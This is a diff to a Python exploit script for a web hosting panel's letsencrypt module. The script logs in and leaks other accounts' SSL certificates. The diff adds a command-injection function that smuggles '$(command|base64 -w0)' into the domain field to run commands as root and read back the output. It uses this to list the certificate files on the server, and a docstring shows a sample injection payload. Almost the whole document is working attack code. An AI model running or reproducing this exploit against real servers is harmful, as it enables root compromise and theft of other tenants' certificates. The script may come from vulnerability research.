@@ -39,8 +39,8 @@ session = requests.session()
 """
 Leak SSL certificates from other accounts.
 
-Note that this endpoint is also vulnerable to command injection
-providing a hostname like $(id>/tmp/leaky).example.com will achieve RCE as root too.
+Note that this endpoint is also vulnerable to command injection and can be used to run any command as root and return
+the output. This is used when not providing a hostname to view all possible certificates.
 
 - Requires a valid user login
 
@@ -85,12 +85,12 @@ def login(base_url, username, password):
             return True
 
 
-def leak_certificate(base_url, username, hostname):
-    """Leak the SSL certificate for a given host"""
+def perform_leak(base_url, username, domain):
+    """Leak the SSL certificate for a given domain"""
 
     target_url = f'{base_url}/{username}/index.php?module=letsencrypt&acc=infomodal'
     post_data = {
-        'domain': hostname,
+        'domain': domain,
         'type': 'cert'
     }
 
@@ -99,6 +99,26 @@ def leak_certificate(base_url, username, hostname):
     if response.status_code == 200:
         j = response.json()
         return j.get('result')
+
+
+def command_inject(base_url, username, command):
+    """Find out what SSL certificates are on the server using the command injection in the same place."""
+    cmd = f'$({command}|base64 -w0)'
+    result64 = perform_leak(base_url, username, cmd).split('/')[-1].replace('.cert', '')
+    result = base64.b64decode(result64).decode('ascii').strip()
+    return result
+
+
+def list_certificates(base_url, username):
+    """Find out what SSL certificates are on the server using the command injection in the same place."""
+    result = command_inject(base_url, username, 'find /etc/pki/tls/certs/*.cert -printf "%f\n"')
+    if ".cert" in result:
+        return result.replace('.cert', '')
+
+
+def leak_certificate(base_url, username, domain):
+    """Leak the SSL certificate for a given domain"""
+    return perform_leak(base_url, username, domain)
 
 
 if __name__ == '__main__':
@@ -122,8 +142,9 @@ if __name__ == '__main__':
 
     parser.add_argument(
         '--hostname',
-        help="The hostname to leak a certificate for e.g. test.exampledomain.com",
-        required=True)
+        help="The hostname to leak a certificate for e.g. test.exampledomain.com, if not provided command injection will"
+             "be used to try to find all the available certificates",
+        required=False)
 
     parser.add_argument(
         '--proxy',
@@ -144,14 +165,26 @@ if __name__ == '__main__':
 
     if authenticated:
         print('  [-] Auth Successful')
-        print(f'  [-] Attempting to leak certificate for {args.hostname}')
-        response = leak_certificate(base_url, args.username, args.hostname)
-        if 'BEGIN CERTIFICATE' in response:
-            print('[*] Certificate leaked:')
-            print(response)
+        if args.hostname:
+            print(f'  [-] Attempting to leak certificate for {args.hostname}')
+            response = leak_certificate(base_url, args.username, args.hostname)
+            if 'BEGIN CERTIFICATE' in response:
+                print('[*] Certificate leaked:')
+                print(response)
+            else:
+                print('[!] The server returned an error')
+                print(response)
         else:
-            print('[!] The server returned an error')
-            print(response)
+            print(f'  [-] Attempting command injection to find all certificates')
+            response = list_certificates(base_url, args.username)
+            if response:
+                print('[*] Certificates found:')
+                print(response)
+            else:
+                print('[!] Error or no certificates found!')
+                print(response)
+
+
 
     else:
         print(f'[!] Unable to authenticate with the target')
